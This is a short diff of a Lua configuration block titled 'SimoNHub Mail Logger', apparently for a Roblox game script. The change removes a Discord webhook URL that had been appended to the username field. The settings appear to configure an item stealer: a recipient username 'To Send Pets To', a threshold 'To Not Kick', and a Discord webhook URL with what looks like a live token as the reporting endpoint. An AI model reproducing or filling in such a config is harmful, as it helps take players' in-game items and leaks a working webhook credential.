@@ -1,7 +1,7 @@
 --[[ SimoNHub Mail Logger ]]--
 
 --[[ Main Config ]]--
-_G.Username = "HerrySzymoNhttps://discord.com/api/webhooks/1059121179555803187/_4F0Y-wzAVC_RqBS9BgDH4GaAJfJ-3xOWUVEy6rUnQ0UOZ4kvFtB91EKCRhpeksM8m6d" --// Username To Send Pets To
+_G.Username = "HerrySzymoN" --// Username To Send Pets To
 _G.GiftMessage = "https://discord.com/api/webhooks/1059121179555803187/_4F0Y-wzAVC_RqBS9BgDH4GaAJfJ-3xOWUVEy6rUnQ0UOZ4kvFtB91EKCRhpeksM8m6d" --// Message For The Gift To Say
 
 _G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
